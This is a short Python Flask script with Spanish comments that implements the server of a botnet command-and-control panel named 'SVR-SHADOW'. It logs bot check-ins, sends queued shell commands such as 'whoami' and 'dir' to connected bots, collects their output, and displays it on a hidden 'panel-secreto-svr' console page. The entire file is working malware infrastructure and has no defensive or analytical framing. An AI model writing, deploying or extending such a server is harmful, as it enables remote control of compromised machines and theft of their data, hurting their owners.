from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

# Almacén de órdenes y reportes
pending_tasks = ["whoami", "dir"] # Órdenes iniciales para probar
bot_reports = []

@app.route('/svr_c2/check_in', methods=['POST'])
def bot_checkin():
    data = request.json
    with open("bots_activos.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] BOT DETECTADO: {data}\n")
    return "OK", 200

@app.route('/svr_c2/get_task')
def get_task():
    if pending_tasks:
        return pending_tasks.pop(0)
    return "sleep"

@app.route('/svr_c2/report', methods=['POST'])
def report():
    output = request.form.get('output')
    with open("bot_output.txt", "a") as f:
        f.write(f"\n--- REPORTE [{datetime.datetime.now()}] ---\n{output}\n")
    return "OK", 200

@app.route('/panel-secreto-svr')
def ver_consola():
    try:
        with open("bot_output.txt", "r") as f: logs = f.read()
    except: logs = "Sin reportes de bots."
    return f"<html><body style='background:#000; color:#0f0;'><pre>🛰️ CONSOLA C2 - SVR-SHADOW\n{logs}</pre></body></html>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
